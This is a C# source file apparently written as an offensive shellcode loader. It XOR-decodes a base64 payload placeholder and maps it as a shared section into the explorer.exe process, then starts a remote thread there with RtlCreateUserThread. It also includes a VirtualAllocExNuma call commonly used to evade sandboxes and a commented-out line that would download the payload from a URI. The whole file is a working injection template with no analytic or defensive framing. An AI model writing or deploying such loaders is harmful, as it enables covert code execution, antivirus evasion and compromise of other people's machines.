using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
       processId);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecurity, 
            bool createSuspended, Int32 stackZeroBits, 
            IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress,
            IntPtr parameter, ref IntPtr threadHandle, IntPtr clientId);

        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
            static extern UInt32 NtCreateSection(
         ref IntPtr SectionHandle,
         UInt32 DesiredAccess,
         IntPtr ObjectAttributes,
         ref UInt32 MaximumSize,
         UInt32 SectionPageProtection,
         UInt32 AllocationAttributes,
         IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(
        IntPtr SectionHandle,
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        UIntPtr ZeroBits,
        UIntPtr CommitSize,
        out ulong SectionOffset,
        out uint ViewSize,
        uint InheritDisposition,
        uint AllocationType,
        uint Win32Protect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
 uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        static void Main(string[] args)
        {
            IntPtr hCurrentProcess = OpenProcess(0x001F0FFF, false, Process.GetCurrentProcess().Id);
            IntPtr mem = VirtualAllocExNuma(hCurrentProcess, IntPtr.Zero, 0x1000, 0x3000, 0x4,0);
            if (mem == null)
            {
                return;
            }
            int id = Process.GetProcessesByName("explorer")[0].Id;
            IntPtr hTargetProcess = OpenProcess(0x001F0FFF, false, id);

            //WebClient wc = new WebClient();

            //byte[] buf = Convert.FromBase64String(wc.DownloadString(URI));

            byte[] buf = Convert.FromBase64String("##BASE64SHELLCODE##");
            byte[] key = Convert.FromBase64String("##BASE64KEY##");
            int k = 0;
            for (int i = 0; i < buf.Length; i++)
            {
                if (k == key.Length)
                {
                    k = 0;
                }
                buf[i] = (byte)((int)buf[i] ^ (int)key[k]);
                k++;
            }
            IntPtr SectionHandle = IntPtr.Zero;
            uint maxSize = (uint)(buf.Length + (4096 - buf.Length%4096));
            
            uint res = NtCreateSection(ref SectionHandle,
                0x0002 | 0x0004 | 0x0008, IntPtr.Zero
                ,ref maxSize, 0x40, 0x08000000, IntPtr.Zero);


            IntPtr currentBaseAddress = IntPtr.Zero;
            ulong sectionOffset = 0;
            uint viewSize = 0;

            res = NtMapViewOfSection(SectionHandle,
                hCurrentProcess,
                ref currentBaseAddress,
                UIntPtr.Zero,
                UIntPtr.Zero,
                out sectionOffset,
                out viewSize,
                2,
                0,
                0x04
                );

            Marshal.Copy(buf, 0, currentBaseAddress, buf.Length);

            IntPtr targetBaseAddress = IntPtr.Zero;
            
            res = NtMapViewOfSection(SectionHandle,
                hTargetProcess,
                ref targetBaseAddress,
                UIntPtr.Zero,
                UIntPtr.Zero,
                out sectionOffset,
                out viewSize,
                2,
                0,
                0x20
                );

            IntPtr hRemoteThread = IntPtr.Zero;
            IntPtr res2 = RtlCreateUserThread(hTargetProcess, IntPtr.Zero, false, 0,
                IntPtr.Zero, IntPtr.Zero,
                targetBaseAddress, IntPtr.Zero, ref hRemoteThread, IntPtr.Zero);
        }
    }
}

